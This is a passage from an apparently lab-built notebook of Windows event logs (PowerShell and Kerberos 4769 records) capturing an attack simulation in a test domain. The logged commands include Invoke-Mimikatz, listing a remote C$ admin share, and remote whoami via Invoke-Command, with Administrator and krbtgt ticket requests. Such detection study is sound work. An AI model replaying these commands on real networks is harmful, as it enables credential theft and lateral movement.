  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.6. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563112938.98" ts_lastsave="1563113062.3" unique_id="272"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.474474000Z&quot; /&gt; 
      &lt;EventRecordID&gt;626992&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-ee36-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3784&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 38 Command Name = Add-Member Command Type = Cmdlet Script Name = C:\Users\GConcy\Desktop\Invoke-Mimikatz.ps1 Command Path = Sequence Number = 24544 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(Add-Member): &quot;Add-Member&quot; ParameterBinding(Add-Member): name=&quot;Name&quot;; value=&quot;VirtualAlloc&quot; ParameterBinding(Add-Member): name=&quot;Value&quot;; value=&quot;MyDelegateType&quot; ParameterBinding(Add-Member): name=&quot;MemberType&quot;; value=&quot;NoteProperty&quot; ParameterBinding(Add-Member): name=&quot;InputObject&quot;; value=&quot;System.Object&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.b.1. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563113398.04" ts_lastsave="1563113415.58" unique_id="273"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:07:57.673788900Z&quot; /&gt; 
      &lt;EventRecordID&gt;634973&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0000-4d2f-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3904&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 48 Command Name = Get-ChildItem Command Type = Cmdlet Script Name = Command Path = Sequence Number = 40820 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(Get-ChildItem): &quot;Get-ChildItem&quot; ParameterBinding(Get-ChildItem): name=&quot;Path&quot;; value=&quot;\\WIN-BO2CT95INDP\C$&quot; CommandInvocation(Out-Default): &quot;Out-Default&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;PerfLogs&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;Program Files&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;Program Files (x86)&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;Users&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;Windows&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;gg&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.c.1. 4104 - Execute a Remote Command" prog_lang="xml" readonly="True" tags="" ts_creation="1563113574.26" ts_lastsave="1563113646.46" unique_id="274"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4104&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;5&lt;/Level&gt; 
      &lt;Task&gt;2&lt;/Task&gt; 
      &lt;Opcode&gt;15&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:10:51.202746400Z&quot; /&gt; 
      &lt;EventRecordID&gt;635022&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-eb6e-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;5808&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;MessageNumber&quot;&gt;1&lt;/Data&gt; 
      &lt;Data Name=&quot;MessageTotal&quot;&gt;1&lt;/Data&gt; 
      &lt;Data Name=&quot;ScriptBlockText&quot;&gt;Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }&lt;/Data&gt; 
      &lt;Data Name=&quot;ScriptBlockId&quot;&gt;4c6feabe-fb2b-4117-abc6-b81d79f4fcfe&lt;/Data&gt; 
      &lt;Data Name=&quot;Path&quot; /&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.c.1. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563113575.13" ts_lastsave="1563113670.56" unique_id="275"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:10:51.954398800Z&quot; /&gt; 
      &lt;EventRecordID&gt;635040&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-ec6e-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;5808&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 56 Command Name = Invoke-Command Command Type = Cmdlet Script Name = Command Path = Sequence Number = 40830 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(Invoke-Command): &quot;Invoke-Command&quot; ParameterBinding(Invoke-Command): name=&quot;ComputerName&quot;; value=&quot;WIN-BO2CT95INDP&quot; ParameterBinding(Invoke-Command): name=&quot;ScriptBlock&quot;; value=&quot; whoami &quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.c.3. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563113575.93" ts_lastsave="1563113688.08" unique_id="276"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:10:51.955521100Z&quot; /&gt; 
      &lt;EventRecordID&gt;635041&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-eb6e-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;5808&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 56 Command Name = Command Type = Script Script Name = Command Path = Sequence Number = 40832 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(Out-Default): &quot;Out-Default&quot; ParameterBinding(Out-Default): name=&quot;InputObject&quot;; value=&quot;bossmanben\administrator&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="AD Logs" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1563114087.27" ts_lastsave="1563116096.02" unique_id="277"><rich_text scale="h1" weight="heavy">LOGS GENERATED:</rich_text><rich_text>
</rich_text><rich_text scale="h2">• LogName: Security</rich_text><rich_text>:
</rich_text><rich_text scale="h3">
    2.1. </rich_text><rich_text link="node 285" scale="h3">4769 - Kerberos Service Ticket Operations (Success)</rich_text><rich_text scale="h3">
    
    4.b.1. </rich_text><rich_text link="node 280" scale="h3">4769 - Kerberos Service Ticket Operations (Success)</rich_text><rich_text scale="h3">
    4.b.2. </rich_text><rich_text link="node 286" scale="h3">4769 - Kerberos Service Ticket Operations (Success)</rich_text><rich_text scale="h3">
    
    4.c.1. </rich_text><rich_text link="node 279" scale="h3">4769 - Kerberos Service Ticket Operations (Success)</rich_text><rich_text scale="h3">
</rich_text><rich_text>
</rich_text><rich_text scale="h2">• Sysmon Logs:</rich_text><rich_text scale="h3">
    
    4.c.1. </rich_text><rich_text link="node 282" scale="h3">1 - Process Create (rule: ProcessCreate)</rich_text><rich_text scale="h3">
    4.c.2. </rich_text><rich_text link="node 284" scale="h3">11 - File created (rule: FileCreate)</rich_text><rich_text scale="h3">
    4.c.3. </rich_text><rich_text link="node 283" scale="h3">1 - Process Create (rule: ProcessCreate)</rich_text><rich_text>
</rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="LogName: Security" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1563114631.86" ts_lastsave="1563115180.87" unique_id="278"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="2.1. 4769 - Kerberos Service Ticket Operations (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563115181.04" ts_lastsave="1563115186.64" unique_id="285"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-A5BA-3E3B0328C30D}&quot; /&gt; 
      &lt;EventID&gt;4769&lt;/EventID&gt; 
      &lt;Version&gt;0&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;14337&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:36:45.445860200Z&quot; /&gt; 
      &lt;EventRecordID&gt;29579&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;624&quot; ThreadID=&quot;2380&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;WIN-BO2CT95INDP.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy@BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceName&quot;&gt;MSEDGEWIN10$&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1104&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketOptions&quot;&gt;0x40810000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketEncryptionType&quot;&gt;0x12&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;::ffff:192.168.150.128&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;49761&lt;/Data&gt; 
      &lt;Data Name=&quot;Status&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{8B2F9A79-E030-4BAC-B321-1937A31F2D5E}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.b.1. 4769 - Kerberos Service Ticket Operations (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563115304.09" ts_lastsave="1563115356.55" unique_id="280"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-A5BA-3E3B0328C30D}&quot; /&gt; 
      &lt;EventID&gt;4769&lt;/EventID&gt; 
      &lt;Version&gt;0&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;14337&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:41:02.288030600Z&quot; /&gt; 
      &lt;EventRecordID&gt;29580&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;624&quot; ThreadID=&quot;2380&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;WIN-BO2CT95INDP.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator@BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceName&quot;&gt;WIN-BO2CT95INDP$&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketOptions&quot;&gt;0x40810000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketEncryptionType&quot;&gt;0x12&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;::ffff:192.168.150.128&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;49766&lt;/Data&gt; 
      &lt;Data Name=&quot;Status&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{CE66BA4C-B7F0-4416-3B46-BE625520694D}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.b.2. 4769 - Kerberos Service Ticket Operations (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563115304.81" ts_lastsave="1563115391.79" unique_id="286"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-A5BA-3E3B0328C30D}&quot; /&gt; 
      &lt;EventID&gt;4769&lt;/EventID&gt; 
      &lt;Version&gt;0&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;14337&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:41:02.291738000Z&quot; /&gt; 
      &lt;EventRecordID&gt;29581&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;624&quot; ThreadID=&quot;2380&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;WIN-BO2CT95INDP.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator@BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceName&quot;&gt;krbtgt&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-502&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketOptions&quot;&gt;0x60810010&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketEncryptionType&quot;&gt;0x12&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;::ffff:192.168.150.128&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;49767&lt;/Data&gt; 
      &lt;Data Name=&quot;Status&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{CE66BA4C-B7F0-4416-3B46-BE625520694D}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.c.1. 4769 - Kerberos Service Ticket Operations (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563114675.56" ts_lastsave="1563114686.53" unique_id="279"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-A5BA-3E3B0328C30D}&quot; /&gt; 
      &lt;EventID&gt;4769&lt;/EventID&gt; 
      &lt;Version&gt;0&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;14337&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T05:29:45.847688500Z&quot; /&gt; 
      &lt;EventRecordID&gt;29576&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;624&quot; ThreadID=&quot;2380&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;WIN-BO2CT95INDP.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator@BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceName&quot;&gt;WIN-BO2CT95INDP$&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketOptions&quot;&gt;0x40810000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketEncryptionType&quot;&gt;0x12&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;::ffff:192.168.150.128&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;49741&lt;/Data&gt; 
      &lt;Data Name=&quot;Status&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{7B920217-CB3E-3234-6567-9176B839FC77}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;